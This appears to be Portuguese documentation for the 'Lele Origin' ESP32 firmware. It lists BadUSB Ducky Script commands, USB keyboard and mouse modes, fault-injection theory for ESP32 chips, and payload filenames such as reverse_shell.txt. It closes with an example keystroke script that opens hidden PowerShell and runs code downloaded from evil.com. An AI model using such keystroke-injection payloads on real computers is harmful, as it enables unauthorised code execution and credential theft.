# ⚡ Ataques USB e Fault Injection

Documentação sobre funcionalidades USB e conceitos de Fault Injection.

---

## 🖱️ Ataques USB Implementados

### BadUSB (Ducky Script)

**Arquivo:** `src/modules/badusb_ble/ducky_typer.cpp`

O Lele suporta execução de scripts Ducky para ataques BadUSB, transformando o dispositivo em um teclado malicioso.

#### Modos de Operação

| Modo | Interface | Descrição |
|------|-----------|-----------|
| USB HID | USB direto | Teclado via porta USB |
| BLE HID | Bluetooth | Teclado sem fio via BLE |

#### Comandos Ducky Suportados

| Comando | Descrição |
|---------|-----------|
| `STRING texto` | Digita o texto |
| `STRINGLN texto` | Digita e pressiona Enter |
| `DELAY ms` | Aguarda X milissegundos |
| `DEFAULTDELAY ms` | Define delay padrão |
| `REM comentário` | Comentário (ignorado) |
| `REPEAT n` | Repete comando anterior |

#### Teclas Especiais

| Comando | Tecla |
|---------|-------|
| `ENTER` | Enter |
| `GUI` / `WINDOWS` | Tecla Windows |
| `CTRL` | Control |
| `ALT` | Alt |
| `SHIFT` | Shift |
| `TAB` | Tab |
| `ESCAPE` | Esc |
| `BACKSPACE` | Backspace |
| `DELETE` | Delete |
| `F1`-`F12` | Teclas de função |
| `UP/DOWN/LEFT/RIGHT` | Setas |

#### Combinações

| Comando | Combinação |
|---------|------------|
| `CTRL-ALT` | Ctrl + Alt |
| `CTRL-SHIFT` | Ctrl + Shift |
| `CTRL-GUI` | Ctrl + Win |
| `ALT-GUI` | Alt + Win |
| `GUI-SHIFT` | Win + Shift |

#### Layouts de Teclado

| ID | Layout |
|----|--------|
| 0 | US English |
| 3 | French (FR) |
| 4 | German (DE) |
| 6 | Italian (IT) |
| 8 | **Português Brasil** |
| 9 | Português Portugal |
| 11 | Spanish (ES) |

---

### USB Mouse (Clicker)

**Arquivo:** `src/modules/others/clicker.cpp`

Auto-clicker USB que simula cliques de mouse em alta velocidade.

**Uso:** Automação, testes de stress, jogos

---

### USB Keyboard

**Arquivo:** `ducky_typer.cpp` (função `ducky_keyboard`)

Transforma o dispositivo em um teclado USB interativo para digitar em tempo real.

---

## 🔩 Fault Injection (Teoria)

> ⚠️ **NOTA:** Fault Injection NÃO está implementado no Lele Origin. Esta seção é apenas informativa.

### O que é Fault Injection?

Técnica de ataque que introduz erros controlados em um chip para:
- Bypass de Secure Boot
- Extração de chaves criptográficas
- Execução de código arbitrário
- Desbloqueio de JTAG

### Tipos de Fault Injection

| Tipo | Método |
|------|--------|
| **Voltage Glitch** | Variação rápida na tensão |
| **Clock Glitch** | Perturbação no clock |
| **EMFI** | Injeção eletromagnética |
| **Laser** | Pulso de laser focado |

### Voltage Glitch em ESP32

**Hardware necessário:**
- ChipWhisperer ou similar
- Osciloscópio
- Fontes de 3.3V
- Modificações na placa (cortar trilhas)

**Pontos de ataque:**
- VDD3P3_CPU
- VDD_PST2 (ESP32-C6)
- VDD3P3_RTC

**Parâmetros críticos:**
- Duração: 1-3 ciclos de clock
- Timing: durante boot ROM
- Tensão: variação de ~0.5V

### Versões ESP32 Vulneráveis

| Versão | Vulnerabilidade |
|--------|-----------------|
| ESP32 V0/V1 | Alto - chaves extraíveis |
| ESP32 V3 | Médio - hardened |
| ESP32-C3/C6 | Baixo - contramedidas |
| ESP32-S3 | Baixo - PKI secure boot |

### Referências

- [Raelize - ESP32 Fault Injection](https://raelize.com)
- [ChipWhisperer Documentation](https://chipwhisperer.readthedocs.io)
- [Espressif Security Advisory](https://espressif.com/security)

---

## 🛠️ Limitações na Placa CYD-2USB

| Funcionalidade | Status | Motivo |
|----------------|--------|--------|
| USB HID | ❌ Limitado | ESP32 padrão (não S3) |
| BadUSB via USB | ❌ Requer adaptador | Sem USB nativo |
| BadBLE | ✅ Funciona | Via Bluetooth HID |
| USB Mouse | ❌ Limitado | Sem USB HID nativo |
| Fault Injection | ❌ Não implementado | Requer hardware externo |

> **Nota:** Para USB HID nativo, é recomendado ESP32-S2 ou ESP32-S3 que possuem USB OTG.

---

## 📁 Arquivos de Payload

Os scripts Ducky devem ser salvos no cartão SD:

```
/lele/badusb/
├── reverse_shell.txt
├── wifi_password.txt
├── CredentialHarvest.txt
└── DigiSpark.txt
```

### Exemplo de Script

```ducky
REM Abre PowerShell e baixa payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
ENTER
```
